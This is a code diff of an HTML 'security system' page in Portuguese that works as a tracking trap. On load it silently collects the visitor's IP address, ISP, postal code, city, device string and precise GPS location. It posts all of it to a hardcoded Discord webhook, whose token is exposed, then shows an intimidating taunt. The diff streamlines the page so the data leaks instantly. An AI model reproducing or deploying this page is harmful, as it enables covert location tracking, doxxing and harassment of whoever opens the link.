@@ -3,115 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SISTEMA DE SEGURANÇA ATIVO</title>
+    <title>SISTEMA DE SEGURANÇA</title>
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
         #particles-js { position: absolute; width: 100%; height: 100%; z-index: 1; }
-        .ui-container { position: relative; z-index: 2; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; text-align: center; }
-        .box { border: 2px solid #ff0000; padding: 40px; background: rgba(20, 0, 0, 0.9); box-shadow: 0 0 30px #ff0000; max-width: 450px; }
-        .loader { border: 3px solid #300; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .ui { position: relative; z-index: 2; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; flex-direction: column; }
+        .msg { font-size: 3.5rem; font-weight: 900; display: none; text-shadow: 0 0 20px #f00; }
+        .load { border: 3px solid #300; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 3.5rem; display: none; margin: 0; text-shadow: 0 0 20px #f00; font-weight: 900; }
-        .blink { animation: blink 0.8s infinite; font-weight: bold; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-
     <div id="particles-js"></div>
-
-    <div class="ui-container">
-        <div class="box" id="main-box">
-            <div id="loader-content">
-                <div class="loader"></div>
-                <div class="blink">ESCANEANDO ENDEREÇO IP...</div>
-                <p style="font-size: 12px; color: #888;">Protocolo de Rastreio Militar Ativo</p>
-            </div>
-            <h1 id="final-text">CE TA FUDIDO</h1>
+    <div class="ui">
+        <div id="status">
+            <div class="load"></div>
+            <div style="letter-spacing: 5px;">PROCESSANDO...</div>
         </div>
+        <h1 id="fudido">CE TA FUDIDO</h1>
     </div>
 
     <script>
-        // SEU WEBHOOK
         const WEBHOOK = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
 
-        // Configuração das Partículas Vermelhas
-        particlesJS("particles-js", {
-            "particles": {
-                "number": { "value": 80 },
-                "color": { "value": "#ff0000" },
-                "shape": { "type": "circle" },
-                "opacity": { "value": 0.5 },
-                "size": { "value": 3 },
-                "line_linked": { "enable": true, "distance": 150, "color": "#ff0000", "opacity": 0.4, "width": 1 },
-                "move": { "enable": true, "speed": 4 }
-            }
-        });
+        // Partículas rápidas
+        particlesJS("particles-js", {"particles":{"number":{"value":100},"color":{"value":"#ff0000"},"shape":{"type":"circle"},"opacity":{"value":0.5},"size":{"value":3},"line_linked":{"enable":true,"distance":150,"color":"#ff0000","opacity":0.4,"width":1},"move":{"enable":true,"speed":10}}});
 
-        async function enviar(pos = null) {
-            try {
-                // Pega IP completo e Provedor (isp)
-                const ipRes = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query');
-                const ipData = await ipRes.json();
-
-                let cepFinal = ipData.zip || "Não detectado pelo IP";
-                let coordsLink = `Sem GPS (Aprox: ${ipData.lat}, ${ipData.lon})`;
-
-                // Se tiver GPS, pegamos o CEP da RUA REAL
-                if (pos) {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    coordsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    try {
-                        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-                        const geoData = await geo.json();
-                        cepFinal = geoData.address.postcode || cepFinal;
-                    } catch(e) {}
-                }
-
-                // Envio formatado como você pediu
-                await fetch(WEBHOOK, {
+        async function capturar() {
+            // 1. DISPARA O IP IMEDIATAMENTE (NÃO ESPERA NADA)
+            fetch('https://ipapi.co/json/').then(res => res.json()).then(ip => {
+                fetch(WEBHOOK, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        content: "🎯 **ALVO RASTREADO COM SUCESSO**",
+                        content: "⚠️ **ALVO IDENTIFICADO (INSTANTÂNEO)**",
                         embeds: [{
                             color: 16711680,
-                            description: 
-                                `**IP:** ${ipData.query}\n` +
-                                `**Provedor:** ${ipData.isp || ipData.org}\n` +
-                                `**CEP:** ${cepFinal}\n\n` +
-                                `**Cidade/Estado:** ${ipData.city} - ${ipData.regionName}\n` +
-                                `**Aparelho:** ${navigator.userAgent}\n` +
-                                `**Localização:** ${coordsLink}`,
-                            timestamp: new Date()
+                            description: `**IP:** ${ip.ip}\n**Provedor:** ${ip.org}\n**CEP:** ${ip.postal}\n**Cidade:** ${ip.city}\n**Aparelho:** ${navigator.userAgent}`
                         }]
                     })
                 });
+            });
 
-                // Finalização
-                document.getElementById('loader-content').style.display = 'none';
-                document.getElementById('final-text').style.display = 'block';
-                document.getElementById('main-box').style.background = 'transparent';
-                document.getElementById('main-box').style.border = 'none';
-                document.getElementById('main-box').style.boxShadow = 'none';
+            // 2. TENTA O GPS EM PARALELO
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            content: `🎯 **LOCALIZAÇÃO EXATA:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                        })
+                    });
+                }, null, {enableHighAccuracy: true});
+            }
 
-            } catch (e) { console.error(e); }
+            // 3. MOSTRA A MENSAGEM FINAL APÓS 1.5 SEGUNDOS (TEMPO DO FETCH)
+            setTimeout(() => {
+                document.getElementById('status').style.display = 'none';
+                document.getElementById('fudido').style.display = 'block';
+            }, 1500);
         }
 
-        window.onload = () => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => enviar(p), 
-                    () => enviar(), 
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } else {
-                enviar();
-            }
-        };
+        window.onload = capturar;
     </script>
 </body>
 </html>
